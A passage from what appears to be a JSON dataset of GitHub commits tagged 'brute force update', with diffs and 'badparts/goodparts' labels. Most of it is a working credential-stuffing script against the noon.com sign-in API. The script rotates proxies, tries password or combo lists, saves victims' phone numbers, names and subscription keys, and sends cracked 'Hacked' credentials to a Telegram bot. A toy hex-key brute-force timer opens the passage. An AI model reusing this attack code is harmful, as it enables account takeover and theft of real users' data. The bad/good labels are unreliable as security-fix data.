list('0123456789ABCDEF')\n    return str(choice(sign_value)) + 'x' + ''.join(choices(hex_numbers, k=bit_amount))\n\n\n# print(key_generation())\n\n\ndef key_brute_force(key):\n    start = int(time() * 1000)\n    bit_amount = len(key[2::])\n    k = 0\n    base = \"{:0\" + str(bit_amount) + \"X}\"\n    while k < 16 ** bit_amount:\n        if base.format(k) == key[2::]:\n            if key[0] == 0:\n                finish = time() * 1000\n            else:\n                finish = time() * 1000\n            break\n\n        k += 1\n    return f\"Brute force time: {finish - start}\"\n\n# print(key_brute_force('Enter your key'))\n"}},"msg":"Update key brute force function"},"cc01cc633ccf4cd331809b5107aad5ec8d74b2da":{"url":"https:\/\/api.github.com\/repos\/YurichS\/blockchain\/commits\/cc01cc633ccf4cd331809b5107aad5ec8d74b2da","html_url":"https:\/\/github.com\/YurichS\/blockchain\/commit\/cc01cc633ccf4cd331809b5107aad5ec8d74b2da","message":"Update key brute force function","sha":"cc01cc633ccf4cd331809b5107aad5ec8d74b2da","keyword":"brute force update","diff":"diff --git a\/options_amount_and_BF.py b\/options_amount_and_BF.py\nindex 6e390cc..5c281d9 100644\n--- a\/options_amount_and_BF.py\n+++ b\/options_amount_and_BF.py\n@@ -22,11 +22,11 @@ def key_generation():\n \n def key_brute_force(key):\n     start = int(time() * 1000)\n-    bit_amount = len(key[2::])\n+    bit_amount = len(key[2:])\n     k = 0\n     base = \"{:0\" + str(bit_amount) + \"X}\"\n     while k < 16 ** bit_amount:\n-        if base.format(k) == key[2::]:\n+        if base.format(k) == key[2:]:\n             finish = time() * 1000\n             break\n         k += 1\n","files":{"\/options_amount_and_BF.py":{"changes":[{"diff":"\n \n def key_brute_force(key):\n     start = int(time() * 1000)\n-    bit_amount = len(key[2::])\n+    bit_amount = len(key[2:])\n     k = 0\n     base = \"{:0\" + str(bit_amount) + \"X}\"\n     while k < 16 ** bit_amount:\n-        if base.format(k) == key[2::]:\n+        if base.format(k) == key[2:]:\n             finish = time() * 1000\n             break\n         k += 1\n","add":2,"remove":2,"filename":"\/options_amount_and_BF.py","badparts":["    bit_amount = len(key[2::])","        if base.format(k) == key[2::]:"],"goodparts":["    bit_amount = len(key[2:])","        if base.format(k) == key[2:]:"]}],"source":"\nfrom random import choices, choice from time import time def options_amount(): bit_amount=int(input('How many bits in sequence?(8,16,32,64,128,256,512,1024,2048,4096): ')) return 2 ** bit_amount def key_generation(): bit_amount=int(input('How many bits in sequence?(8,16,32,64,128,256,512,1024,2048,4096): ')) sign_value=[0, 1] hex_numbers=list('0123456789ABCDEF') return str(choice(sign_value)) +'x' +''.join(choices(hex_numbers, k=bit_amount)) def key_brute_force(key): start=int(time() * 1000) bit_amount=len(key[2::]) k=0 base=\"{:0\" +str(bit_amount) +\"X}\" while k < 16 ** bit_amount: if base.format(k)==key[2::]: finish=time() * 1000 break k +=1 return f\"Brute force time:{finish -start}\" ","sourceWithComments":"from random import choices, choice\nfrom time import time\n\n\ndef options_amount():\n    bit_amount = int(input('How many bits in sequence?(8,16,32,64,128,256,512,1024,2048,4096): '))\n    return 2 ** bit_amount\n\n\n# print(options_amount())\n\n\ndef key_generation():\n    bit_amount = int(input('How many bits in sequence?(8,16,32,64,128,256,512,1024,2048,4096): '))\n    sign_value = [0, 1]\n    hex_numbers = list('0123456789ABCDEF')\n    return str(choice(sign_value)) + 'x' + ''.join(choices(hex_numbers, k=bit_amount))\n\n\n# print(key_generation())\n\n\ndef key_brute_force(key):\n    start = int(time() * 1000)\n    bit_amount = len(key[2::])\n    k = 0\n    base = \"{:0\" + str(bit_amount) + \"X}\"\n    while k < 16 ** bit_amount:\n        if base.format(k) == key[2::]:\n            finish = time() * 1000\n            break\n        k += 1\n    return f\"Brute force time: {finish - start}\"\n\n\n# print(key_brute_force('Enter your key'))\n"}},"msg":"Update key brute force function"}},"https:\/\/github.com\/Filza2\/Brute-Force-Noon":{"76e19dac66abd023482e850321e0e3d902da24e5":{"url":"https:\/\/api.github.com\/repos\/Filza2\/Brute-Force-Noon\/commits\/76e19dac66abd023482e850321e0e3d902da24e5","html_url":"https:\/\/github.com\/Filza2\/Brute-Force-Noon\/commit\/76e19dac66abd023482e850321e0e3d902da24e5","sha":"76e19dac66abd023482e850321e0e3d902da24e5","keyword":"brute force update","diff":"diff --git a\/Brute-Force-Noon.py b\/Brute-Force-Noon.py\nindex 5211974..960bd49 100644\n--- a\/Brute-Force-Noon.py\n+++ b\/Brute-Force-Noon.py\n@@ -1,113 +1,44 @@\n-#head~data by @D0omy\n-try:\n-\tproxy=open('proxy.txt', 'r').read().splitlines()\n-except FileNotFoundError:\n-\tprint('\u0645\u0644\u0641 \u0627\u0644\u0628\u0631\u0648\u0643\u0633\u064a \u063a\u064a\u0631 \u0645\u0648\u062c\u0648\u062f')\n-\tprint('Proxy file not found')\n-\tinput()\n-\texit()\n-def noon():\n-\tglobal threading,requests,random,Thread,email\n-\ttry:\n-\t\tpess=open('password.txt').read().splitlines()\n-\texcept FileNotFoundError:\n-\t\tprint('\u0645\u0644\u0641 \u0627\u0644\u0628\u0627\u0633\u0648\u0631\u062f \u063a\u064a\u0631 \u0645\u0648\u062c\u0648\u062f')\n-\t\tprint('password file not found')\n-\t\ttry:\n-\t\t\tinput()\n-\t\t\texit()\n-\t\texcept KeyboardInterrupt:\n-\t\t\texit()\n-\tproxylist=[]\n-\twhile True:\n-\t\tfor pxr in proxy:\n-\t\t\tproxylist.append(pxr)\n-\t\t\tpxx=str(random.choice(proxylist))\n-\t\tfor pess in pess:\n-\t\t\thead={\n-                'Host': 'api-app.noon.com',\n-                'Cookie': 'missing',\n-                'Content-Type': 'application\/json',\n-                'X-Experience': 'ecom',\n-                'X-Locale': 'ar-sa',\n-                'Accept': 'application\/json, text\/plain, *\/*',\n-                'X-Mp': 'noon',\n-                'Accept-Language': 'en-us',\n-                'Cache-Control': 'no-cache',\n-                'X-Content': 'mobile',\n-                'Content-Length': '52',\n-                'User-Agent': 'noon\/1000 CFNetwork\/1237 Darwin\/20.4.0',\n-                'X-Device-Id': '9149EBD3-33DE-4568-918B-0469ECAA6453',\n-                'X-Platform': 'ios',\n-                'X-Build': '1000',\n-                'Connection': 'close'}\n-\t\t\tdata={\"email\": email,\"password\": pess}\t\t\n-\t\t\ttry:\n-\t\t\t\tproxx = {\n-\t\t\t\t\t'http': f'http:\/\/{pxx}',\n-\t\t\t\t\t'https': f'http:\/\/{pxx}'}\n-\t\t\t\treq1=requests.post(\"https:\/\/api-app.noon.com\/_svc\/customer-v1\/auth\/signin\",headers=head,json=data,proxies=proxx,timeout=4)\n-\t\t\t\tif req1.status_code==200:\n-\t\t\t\t\tprint(f'\\n[+] Done [{email}:{pess}]')\n-\t\t\t\t\tprint(f'[+] Check acc_Done.txt For more INFO about this account')\n-\t\t\t\t\tphone=req1.json()['data']['phone']\n-\t\t\t\t\tlN=req1.json()['data']['lastName']\n-\t\t\t\t\tlc=req1.json()['data']['languageCode']\n-\t\t\t\t\tjD=req1.json()['data']['joinDate']\n-\t\t\t\t\tia=req1.json()['data']['id']\n-\t\t\t\t\tgr=req1.json()['data']['gender']\n-\t\t\t\t\tfnm=req1.json()['data']['firstName']\n-\t\t\t\t\tcoc=req1.json()['data']['countryCode']\n-\t\t\t\t\tsKey=req1.json()['data']['subscriptionKey']\n-\t\t\t\t\twith open('acc_Done.txt', 'a') as x:\n-\t\t\t\t\t\tacc=f'Phone Num:[{phone}]\\nLast Name:[{lN}]\\nlanguage:[{lc}]\\nJoin Date:[{jD}]\\nID:[{ia}]\\nGender:[{gr}]\\nFirst Name:[{fnm}]\\nEmail:[{email}]\\nPassword:[{pess}]\\nCountry Code:[{coc}]\\nSubscription Key:[{sKey}]'\n-\t\t\t\t\t\tx.write(acc)\n-\t\t\t\t\t\texit()\n-\t\t\t\telse:\n-\t\t\t\t\tprint(f'[-] NOT HACKED {email}:{pess}')\n-\t\t\texcept requests.exceptions.ConnectionError:\n-\t\t\t\tprint(f'[%] Bad Proxy <{str(pxx)}>')\n-\t\t\t\tpass\n-\t\t\texcept KeyboardInterrupt:\n-\t\t\t\texit()\n-def TRT():\n-\tglobal threading,requests,random,Thread,email\n-\tthread=[]\n-\tfor i in range(Thread):\n-\t\tthread1 = threading.Thread(target=noon)\n-\t\tthread1.start()\n-\t\tthread.append(thread1)\n-\t\tfor thread2 in thread:\n-\t\t\tthread2.join()\n-def library():\n-\tglobal threading,requests,random,Thread,email\n-\ttry:\n-\t\timport requests,random\n-\texcept ModuleNotFoundError:\n-\t\tprint('\u064a\u062c\u0628 \u0639\u0644\u064a\u0643 \u062a\u062d\u0645\u064a\u0644 \u0627\u0644\u0645\u0643\u062a\u0628\u0629')\n-\t\tprint('You must download the library')\n-\t\tprint('pip install requests')\n-\t\texit()\n-\ttry:\n-\t\timport threading\n-\texcept ModuleNotFoundError:\n-\t\tprint('\u064a\u062c\u0628 \u0639\u0644\u064a\u0643 \u062a\u062d\u0645\u064a\u0644 \u0627\u0644\u0645\u0643\u062a\u0628\u0629')\n-\t\tprint('You must download the library')\n-\t\tprint('pip install threading')\n-\t\texit()\n-\ttry:\n-\t\timport pyfiglet\n-\texcept ModuleNotFoundError:\n-\t\tprint('\u064a\u062c\u0628 \u0639\u0644\u064a\u0643 \u062a\u062d\u0645\u064a\u0644 \u0627\u0644\u0645\u0643\u062a\u0628\u0629')\n-\t\tprint('You must download the library')\n-\t\tprint('pip install pyfiglet')\n-\t\texit()\n-\tprint(f\"\"\"[$] Brute Force \n-\t{pyfiglet.figlet_format('NooN')}---------------------------\"\"\")\n-\tprint(\"By  @TweakPY - @vv1ck\")\n-\tprint(\"---------------------------\")\n-\temail=input(\"[?] Type Email or username:\\n\")\n-\tThread=int(input(\"[\/] Thread: \"))\n-\tprint(\"---------------------------\")\n-\tTRT()\n-library()\n+try:import os;from requests import post;from time import sleep;from colorama import Fore\n+except ModuleNotFoundError:exit('[!] Download The Missing Module !')\n+def header():\n+    print(\"\"\"\n+    \n+\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557    \u2588\u2588\u2588\u2557   \u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557   \u2588\u2588\u2557\n+\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d    \u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551\n+\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\n+\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\n+\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551         \u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\n+\u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d         \u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d  \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d\n+\n+                By @TweakPY - @vv1ck                                         \n+\"\"\")\n+def saver(user,pess,rq):\n+    ID=''#telegram id\n+    token=''#telegram bot token\n+    try:post(f'https:\/\/api.telegram.org\/bot{token}\/sendMessage?chat_id={ID}&text=\u2022 New user Hacked {user}:{pess} \ud83e\udda6\\n\\nBy\\t@TweakPY\\t-\\t@vv1ck')\n+    except:pass\n+    try:\n+        r=rq.json()['data'];phone=r['phone'];sKey=r['subscriptionKey'];lN=r['lastName'];lc=r['languageCode'];jD=r['joinDate'];gr=r['gender'];fnm=r['firstName'];coc=r['countryCode']\n+        with open('Hacked.txt', 'a') as x:\n+            acc=f'USR []\\nPhone Num:[{phone}]\\nLast Name:[{lN}]\\nlanguage:[{lc}]\\nJoin Date:[{jD}]\\nGender:[{gr}]\\nFirst Name:[{fnm}]\\nEmail:[{user}]\\nPassword:[{pess}]\\nCountry Code:[{coc}]\\nSubscription Key:[{sKey}]\\n\\n'\n+            x.write(acc)\n+    except Exception as i:\n+        with open('Hacked.txt', 'a') as x:\n+            x.write(f'USR []\\nEmail:[{user}]\\nPassword:[{pess}]\\n')\n+def Brute_Force_Noon(user,pess):\n+    try:\n+        rq=post('https:\/\/login.noon.com\/_svc\/customer-v1\/auth\/signin',headers={'Host': 'login.noon.com','User-Agent': 'Mozilla\/5.0 (X11; Linux x86_64; rv:91.0) Gecko\/20100101 Firefox\/91.0','Accept': 'application\/json, text\/plain, *\/*','Accept-Language': 'ar,en-US;q=0.7,en;q=0.3','Accept-Encoding': 'gzip, deflate','Referer': 'https:\/\/login.noon.com\/uae-en\/','Content-Type': 'application\/json','Cache-Control': 'no-cache','X-Locale': 'en-ae','X-Platform': 'web','Content-Length': '56','Origin': 'https:\/\/login.noon.com','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','Te': 'trailers'},json={\"email\":user,\"password\":pess})\n+        if rq.status_code==200:os.system('cls' if os.name == 'nt' else 'clear');header();print(f\"\\n\u250c\u2500\u2500(Tweakpy\u327froot)-[~BF-Noon.py]\\n\u2514\u2500$ {Fore.GREEN}Hacked{Fore.RESET} >> {user}:{pess}\");saver(user,pess,rq)\n+        else:os.system('cls' if os.name == 'nt' else 'clear');header();print(f\"\\n\u250c\u2500\u2500(Tweakpy\u327froot)-[~BF-Noon.py]\\n\u2514\u2500$ {Fore.LIGHTRED_EX}Not Hacked{Fore.RESET} >> {user}:{pess}\")\n+    except KeyboardInterrupt:exit()\n+def O_File():\n+    FL=input('[+] Combo File Name : ')\n+    count=0\n+    try:\n+        for x in open(FL,'r').read().splitlines():\n+            count+=1\n+            user=x.split(\":\")[0]\n+            pess=x.split(\":\")[1];sleep(5);Brute_Force_Noon(user,pess)\n+    except IndexError:exit()\n+    except FileNotFoundError:print('[!] The File Not Found !');return O_File()\n+os.system('cls' if os.name == 'nt' else 'clear');header();O_File()\n","message":"","files":{"\/Brute-Force-Noon.py":{"changes":[{"diff":"\n-#head~data by @D0omy\n-try:\n-\tproxy=open('proxy.txt', 'r').read().splitlines()\n-except FileNotFoundError:\n-\tprint('\u0645\u0644\u0641 \u0627\u0644\u0628\u0631\u0648\u0643\u0633\u064a \u063a\u064a\u0631 \u0645\u0648\u062c\u0648\u062f')\n-\tprint('Proxy file not found')\n-\tinput()\n-\texit()\n-def noon():\n-\tglobal threading,requests,random,Thread,email\n-\ttry:\n-\t\tpess=open('password.txt').read().splitlines()\n-\texcept FileNotFoundError:\n-\t\tprint('\u0645\u0644\u0641 \u0627\u0644\u0628\u0627\u0633\u0648\u0631\u062f \u063a\u064a\u0631 \u0645\u0648\u062c\u0648\u062f')\n-\t\tprint('password file not found')\n-\t\ttry:\n-\t\t\tinput()\n-\t\t\texit()\n-\t\texcept KeyboardInterrupt:\n-\t\t\texit()\n-\tproxylist=[]\n-\twhile True:\n-\t\tfor pxr in proxy:\n-\t\t\tproxylist.append(pxr)\n-\t\t\tpxx=str(random.choice(proxylist))\n-\t\tfor pess in pess:\n-\t\t\thead={\n-                'Host': 'api-app.noon.com',\n-                'Cookie': 'missing',\n-                'Content-Type': 'application\/json',\n-                'X-Experience': 'ecom',\n-                'X-Locale': 'ar-sa',\n-                'Accept': 'application\/json, text\/plain, *\/*',\n-                'X-Mp': 'noon',\n-                'Accept-Language': 'en-us',\n-                'Cache-Control': 'no-cache',\n-                'X-Content': 'mobile',\n-                'Content-Length': '52',\n-                'User-Agent': 'noon\/1000 CFNetwork\/1237 Darwin\/20.4.0',\n-                'X-Device-Id': '9149EBD3-33DE-4568-918B-0469ECAA6453',\n-                'X-Platform': 'ios',\n-                'X-Build': '1000',\n-                'Connection': 'close'}\n-\t\t\tdata={\"email\": email,\"password\": pess}\t\t\n-\t\t\ttry:\n-\t\t\t\tproxx = {\n-\t\t\t\t\t'http': f'http:\/\/{pxx}',\n-\t\t\t\t\t'https': f'http:\/\/{pxx}'}\n-\t\t\t\treq1=requests.post(\"https:\/\/api-app.noon.com\/_svc\/customer-v1\/auth\/signin\",headers=head,json=data,proxies=proxx,timeout=4)\n-\t\t\t\tif req1.status_code==200:\n-\t\t\t\t\tprint(f'\\n[+] Done [{email}:{pess}]')\n-\t\t\t\t\tprint(f'[+] Check acc_Done.txt For more INFO about this account')\n-\t\t\t\t\tphone=req1.json()['data']['phone']\n-\t\t\t\t\tlN=req1.json()['data']['lastName']\n-\t\t\t\t\tlc=req1.json()['data']['languageCode']\n-\t\t\t\t\tjD=req1.json()['data']['joinDate']\n-\t\t\t\t\tia=req1.json()['data']['id']\n-\t\t\t\t\tgr=req1.json()['data']['gender']\n-\t\t\t\t\tfnm=req1.json()['data']['firstName']\n-\t\t\t\t\tcoc=req1.json()['data']['countryCode']\n-\t\t\t\t\tsKey=req1.json()['data']['subscriptionKey']\n-\t\t\t\t\twith open('acc_Done.txt', 'a') as x:\n-\t\t\t\t\t\tacc=f'Phone Num:[{phone}]\\nLast Name:[{lN}]\\nlanguage:[{lc}]\\nJoin Date:[{jD}]\\nID:[{ia}]\\nGender:[{gr}]\\nFirst Name:[{fnm}]\\nEmail:[{email}]\\nPassword:[{pess}]\\nCountry Code:[{coc}]\\nSubscription Key:[{sKey}]'\n-\t\t\t\t\t\tx.write(acc)\n-\t\t\t\t\t\texit()\n-\t\t\t\telse:\n-\t\t\t\t\tprint(f'[-] NOT HACKED {email}:{pess}')\n-\t\t\texcept requests.exceptions.ConnectionError:\n-\t\t\t\tprint(f'[%] Bad Proxy <{str(pxx)}>')\n-\t\t\t\tpass\n-\t\t\texcept KeyboardInterrupt:\n-\t\t\t\texit()\n-def TRT():\n-\tglobal threading,requests,random,Thread,email\n-\tthread=[]\n-\tfor i in range(Thread):\n-\t\tthread1 = threading.Thread(target=noon)\n-\t\tthread1.start()\n-\t\tthread.append(thread1)\n-\t\tfor thread2 in thread:\n-\t\t\tthread2.join()\n-def library():\n-\tglobal threading,requests,random,Thread,email\n-\ttry:\n-\t\timport requests,random\n-\texcept ModuleNotFoundError:\n-\t\tprint('\u064a\u062c\u0628 \u0639\u0644\u064a\u0643 \u062a\u062d\u0645\u064a\u0644 \u0627\u0644\u0645\u0643\u062a\u0628\u0629')\n-\t\tprint('You must download the library')\n-\t\tprint('pip install requests')\n-\t\texit()\n-\ttry:\n-\t\timport threading\n-\texcept ModuleNotFoundError:\n-\t\tprint('\u064a\u062c\u0628 \u0639\u0644\u064a\u0643 \u062a\u062d\u0645\u064a\u0644 \u0627\u0644\u0645\u0643\u062a\u0628\u0629')\n-\t\tprint('You must download the library')\n-\t\tprint('pip install threading')\n-\t\texit()\n-\ttry:\n-\t\timport pyfiglet\n-\texcept ModuleNotFoundError:\n-\t\tprint('\u064a\u062c\u0628 \u0639\u0644\u064a\u0643 \u062a\u062d\u0645\u064a\u0644 \u0627\u0644\u0645\u0643\u062a\u0628\u0629')\n-\t\tprint('You must download the library')\n-\t\tprint('pip install pyfiglet')\n-\t\texit()\n-\tprint(f\"\"\"[$] Brute Force \n-\t{pyfiglet.figlet_format('NooN')}---------------------------\"\"\")\n-\tprint(\"By  @TweakPY - @vv1ck\")\n-\tprint(\"---------------------------\")\n-\temail=input(\"[?] Type Email or username:\\n\")\n-\tThread=int(input(\"[\/] Thread: \"))\n-\tprint(\"---------------------------\")\n-\tTRT()\n-library()\n+try:import os;from requests import post;from time import sleep;from colorama import Fore\n+except ModuleNotFoundError:exit('[!] Download The Missing Module !')\n+def header():\n+    print(\"\"\"\n+    \n+\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557    \u2588\u2588\u2588\u2557   \u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557   \u2588\u2588\u2557\n+\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d    \u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551\n+\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\n+\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\n+\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551         \u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\n+\u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d         \u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d  \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d\n+\n+                By @TweakPY - @vv1ck                                         \n+\"\"\")\n+def saver(user,pess,rq):\n+    ID=''#telegram id\n+    token=''#telegram bot token\n+    try:post(f'https:\/\/api.telegram.org\/bot{token}\/sendMessage?chat_id={ID}&text=\u2022 New user Hacked {user}:{pess} \ud83e\udda6\\n\\nBy\\t@TweakPY\\t-\\t@vv1ck')\n+    except:pass\n+    try:\n+        r=rq.json()['data'];phone=r['phone'];sKey=r['subscriptionKey'];lN=r['lastName'];lc=r['languageCode'];jD=r['joinDate'];gr=r['gender'];fnm=r['firstName'];coc=r['countryCode']\n+        with open('Hacked.txt', 'a') as x:\n+            acc=f'USR []\\nPhone Num:[{phone}]\\nLast Name:[{lN}]\\nlanguage:[{lc}]\\nJoin Date:[{jD}]\\nGender:[{gr}]\\nFirst Name:[{fnm}]\\nEmail:[{user}]\\nPassword:[{pess}]\\nCountry Code:[{coc}]\\nSubscription Key:[{sKey}]\\n\\n'\n+            x.write(acc)\n+    except Exception as i:\n+        with open('Hacked.txt', 'a') as x:\n+            x.write(f'USR []\\nEmail:[{user}]\\nPassword:[{pess}]\\n')\n+def Brute_Force_Noon(user,pess):\n+    try:\n+        rq=post('https:\/\/login.noon.com\/_svc\/customer-v1\/auth\/signin',headers={'Host': 'login.noon.com','User-Agent': 'Mozilla\/5.0 (X11; Linux x86_64; rv:91.0) Gecko\/20100101 Firefox\/91.0','Accept': 'application\/json, text\/plain, *\/*','Accept-Language': 'ar,en-US;q=0.7,en;q=0.3','Accept-Encoding': 'gzip, deflate','Referer': 'https:\/\/login.noon.com\/uae-en\/','Content-Type': 'application\/json','Cache-Control': 'no-cache','X-Locale': 'en-ae','X-Platform': 'web','Content-Length': '56','Origin': 'https:\/\/login.noon.com','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','Te': 'trailers'},json={\"email\":user,\"password\":pess})\n+        if rq.status_code==200:os.system('cls' if os.name == 'nt' else 'clear');header();print(f\"\\n\u250c\u2500\u2500(Tweakpy\u327froot)-[~BF-Noon.py]\\n\u2514\u2500$ {Fore.GREEN}Hacked{Fore.RESET} >> {user}:{pess}\");saver(user,pess,rq)\n+        else:os.system('cls' if os.name == 'nt' else 'clear');header();print(f\"\\n\u250c\u2500\u2500(Tweakpy\u327froot)-[~BF-Noon.py]\\n\u2514\u2500$ {Fore.LIGHTRED_EX}Not Hacked{Fore.RESET} >> {user}:{pess}\")\n+    except KeyboardInterrupt:exit()\n+def O_File():\n+    FL=input('[+] Combo File Name : ')\n+    count=0\n+    try:\n+        for x in open(FL,'r').read().splitlines():\n+            count+=1\n+            user=x.split(\":\")[0]\n+            pess=x.split(\":\")[1];sleep(5);Brute_Force_Noon(user,pess)\n+    except IndexError:exit()\n+    except FileNotFoundError:print('[!] The File Not Found !');return O_File()\n+os.system('cls' if os.name == 'nt' else 'clear');header();O_File()\n","add":44,"remove":113,"filename":"\/Brute-Force-Noon.py","badparts":["try:","\tproxy=open('proxy.txt', 'r').read().splitlines()","except FileNotFoundError:","\tprint('\u0645\u0644\u0641 \u0627\u0644\u0628\u0631\u0648\u0643\u0633\u064a \u063a\u064a\u0631 \u0645\u0648\u062c\u0648\u062f')","\tprint('Proxy file not found')","\tinput()","\texit()","def noon():","\tglobal threading,requests,random,Thread,email","\ttry:","\t\tpess=open('password.txt').read().splitlines()","\texcept FileNotFoundError:","\t\tprint('\u0645\u0644\u0641 \u0627\u0644\u0628\u0627\u0633\u0648\u0631\u062f \u063a\u064a\u0631 \u0645\u0648\u062c\u0648\u062f')","\t\tprint('password file not found')","\t\ttry:","\t\t\tinput()","\t\t\texit()","\t\texcept KeyboardInterrupt:","\t\t\texit()","\tproxylist=[]","\twhile True:","\t\tfor pxr in proxy:","\t\t\tproxylist.append(pxr)","\t\t\tpxx=str(random.choice(proxylist))","\t\tfor pess in pess:","\t\t\thead={","                'Host': 'api-app.noon.com',","                'Cookie': 'missing',","                'Content-Type': 'application\/json',","                'X-Experience': 'ecom',","                'X-Locale': 'ar-sa',","                'Accept': 'application\/json, text\/plain, *\/*',","                'X-Mp': 'noon',","                'Accept-Language': 'en-us',","                'Cache-Control': 'no-cache',","                'X-Content': 'mobile',","                'Content-Length': '52',","                'User-Agent': 'noon\/1000 CFNetwork\/1237 Darwin\/20.4.0',","                'X-Device-Id': '9149EBD3-33DE-4568-918B-0469ECAA6453',","                'X-Platform': 'ios',","                'X-Build': '1000',","                'Connection': 'close'}","\t\t\tdata={\"email\": email,\"password\": pess}\t\t","\t\t\ttry:","\t\t\t\tproxx = {","\t\t\t\t\t'http': f'http:\/\/{pxx}',","\t\t\t\t\t'https': f'http:\/\/{pxx}'}","\t\t\t\treq1=requests.post(\"https:\/\/api-app.noon.com\/_svc\/customer-v1\/auth\/signin\",headers=head,json=data,proxies=proxx,timeout=4)","\t\t\t\tif req1.status_code==200:","\t\t\t\t\tprint(f'\\n[+] Done [{email}:{pess}]')","\t\t\t\t\tprint(f'[+] Check acc_Done.txt For more INFO about this account')","\t\t\t\t\tphone=req1.json()['data']['phone']","\t\t\t\t\tlN=req1.json()['data']['lastName']","\t\t\t\t\tlc=req1.json()['data']['languageCode']","\t\t\t\t\tjD=req1.json()['data']['joinDate']","\t\t\t\t\tia=req1.json()['data']['id']","\t\t\t\t\tgr=req1.json()['data']['gender']","\t\t\t\t\tfnm=req1.json()['data']['firstName']","\t\t\t\t\tcoc=req1.json()['data']['countryCode']","\t\t\t\t\tsKey=req1.json()['data']['subscriptionKey']","\t\t\t\t\twith open('acc_Done.txt', 'a') as x:","\t\t\t\t\t\tacc=f'Phone Num:[{phone}]\\nLast Name:[{lN}]\\nlanguage:[{lc}]\\nJoin Date:[{jD}]\\nID:[{ia}]\\nGender:[{gr}]\\nFirst Name:[{fnm}]\\nEmail:[{email}]\\nPassword:[{pess}]\\nCountry Code:[{coc}]\\nSubscription Key:[{sKey}]'","\t\t\t\t\t\tx.write(acc)","\t\t\t\t\t\texit()","\t\t\t\telse:","\t\t\t\t\tprint(f'[-] NOT HACKED {email}:{pess}')","\t\t\texcept requests.exceptions.ConnectionError:","\t\t\t\tprint(f'[%] Bad Proxy <{str(pxx)}>')","\t\t\t\tpass","\t\t\texcept KeyboardInterrupt:","\t\t\t\texit()","def TRT():","\tglobal threading,requests,random,Thread,email","\tthread=[]","\tfor i in range(Thread):","\t\tthread1 = threading.Thread(target=noon)","\t\tthread1.start()","\t\tthread.append(thread1)","\t\tfor thread2 in thread:","\t\t\tthread2.join()","def library():","\tglobal threading,requests,random,Thread,email","\ttry:","\t\timport requests,random","\texcept 